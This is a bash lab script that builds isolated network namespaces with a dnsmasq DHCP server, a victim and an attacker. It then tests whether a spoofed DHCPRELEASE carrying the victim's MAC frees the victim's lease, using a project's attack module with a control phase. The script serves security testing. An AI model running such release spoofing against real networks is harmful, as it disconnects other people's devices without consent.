#!/usr/bin/env bash
# Isolated DHCP release spoofing lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the DHCP server (10.99.0.1, pool 10.99.0.100-119). It keeps its
#             leases in a file, which the lab reads to see whether a lease exists.
#   victim:   a DHCP client. It takes a lease once from the server.
#   attacker: MACabre's release sender. It sends DHCPRELEASE messages from its own port.
#
#   Phase 1 (baseline): the victim holds its lease in the server's lease file.
#   Phase 2 (control): the attacker releases the victim's address with another MAC.
#                      The lease must stay, because the server matches the MAC.
#   Phase 3 (attack): the attacker releases the address with the victim's MAC.
#                     The lease must disappear from the server's file.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcp_release_spoofing_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
VICTIM_MAC="02:00:00:00:00:50"
OTHER_MAC="02:00:00:00:00:99"
SERVER_IP="10.99.0.1"
WORK="$(mktemp -d)"
LEASES="$WORK/leases"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in server victim attacker lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add victim
ip netns add attacker

for pair in "srv:server" "vic:victim" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv vic att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip addr add "$SERVER_IP/24" dev h-srv
ip netns exec server ip link set h-srv up
ip netns exec victim ip link set h-vic address "$VICTIM_MAC"
ip netns exec victim ip link set h-vic up
ip netns exec attacker ip link set h-att up

start_server() {
    ip netns exec server dnsmasq \
        --keep-in-foreground \
        --interface=h-srv \
        --bind-interfaces \
        --port=0 \
        --conf-file=/dev/null \
        --dhcp-authoritative \
        --no-ping \
        --dhcp-range=10.99.0.100,10.99.0.119,12h \
        --dhcp-leasefile="$LEASES" &
    sleep 2
}
start_server

# The victim takes a lease with a discover and a request, and prints the address it got.
LEASE_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp, BOOTP, DHCP
from macabre.attacks.dhcp_starvation import build_discover, build_request

MAC = os.environ["VICTIM_MAC"]
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP) and pkt[BOOTP].op == 2:
        seen.append(pkt)

def options(pkt):
    return {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}

sniffer = AsyncSniffer(iface="h-vic", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)
xid = rng.getrandbits(32)
sendp(build_discover(MAC, xid), iface="h-vic", verbose=False)
time.sleep(1.5)
offers = [p for p in seen if p[BOOTP].xid == xid and options(p).get("message-type") == 2]
if not offers:
    raise SystemExit("no offer")
first = offers[0]
sendp(build_request(MAC, xid, first[BOOTP].yiaddr, options(first).get("server_id")), iface="h-vic", verbose=False)
time.sleep(1.5)
sniffer.stop()
print(first[BOOTP].yiaddr)
'

# Sends one DHCPRELEASE for the given MAC and address from the attacker's port.
RELEASE_CODE='
import os, threading
from macabre.attacks.dhcp_release_spoofing import ReleaseSpoofingConfig, run_release_spoofing
run_release_spoofing(
    ReleaseSpoofingConfig(
        iface="h-att",
        client_mac=os.environ["RELEASE_MAC"],
        client_ip=os.environ["LEASED_IP"],
        server_ip="10.99.0.1",
        releases=1,
    ),
    threading.Event(),
    lambda _s: None,
)
'

# True when the server's lease file still has a lease for the victim's address with this MAC.
lease_holds() {
    local mac="$1" ip="$2"
    sleep 1
    if grep -qi " $mac $ip " "$LEASES" 2>/dev/null; then
        echo yes
    else
        echo no
    fi
}

LEASED_IP="$(ip netns exec victim env PYTHONPATH="$ROOT/src" VICTIM_MAC="$VICTIM_MAC" "$PY" -c "$LEASE_CODE" 2>/dev/null | tail -1)"
if [[ -z "$LEASED_IP" ]]; then
    echo "Result: inconclusive. The victim did not get a lease from the server, so there is nothing to release."
    exit 2
fi
ip netns exec victim ip addr add "$LEASED_IP/24" dev h-vic

echo "Phase 1: baseline, the victim holds $LEASED_IP"
BASE="$(lease_holds "$VICTIM_MAC" "$LEASED_IP")"
echo "  lease for the victim still in the server's file: $BASE"
echo

echo "Phase 2: control, a release with another MAC for the same address"
ip netns exec attacker env PYTHONPATH="$ROOT/src" RELEASE_MAC="$OTHER_MAC" LEASED_IP="$LEASED_IP" "$PY" -c "$RELEASE_CODE"
CONTROL="$(lease_holds "$VICTIM_MAC" "$LEASED_IP")"
echo "  lease for the victim still in the server's file: $CONTROL"
echo

echo "Phase 3: attack, a release with the victim's MAC and address"
ip netns exec attacker env PYTHONPATH="$ROOT/src" RELEASE_MAC="$VICTIM_MAC" LEASED_IP="$LEASED_IP" "$PY" -c "$RELEASE_CODE"
AFTER="$(lease_holds "$VICTIM_MAC" "$LEASED_IP")"
echo "  lease for the victim still in the server's file: $AFTER"
echo

if [[ "$BASE" == "yes" && "$CONTROL" == "yes" && "$AFTER" == "no" ]]; then
    echo "Result: the server kept the victim's lease when the release carried another MAC, and freed $LEASED_IP when it carried the victim's MAC. Vulnerable on this server. Other servers' checks need the target device."
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
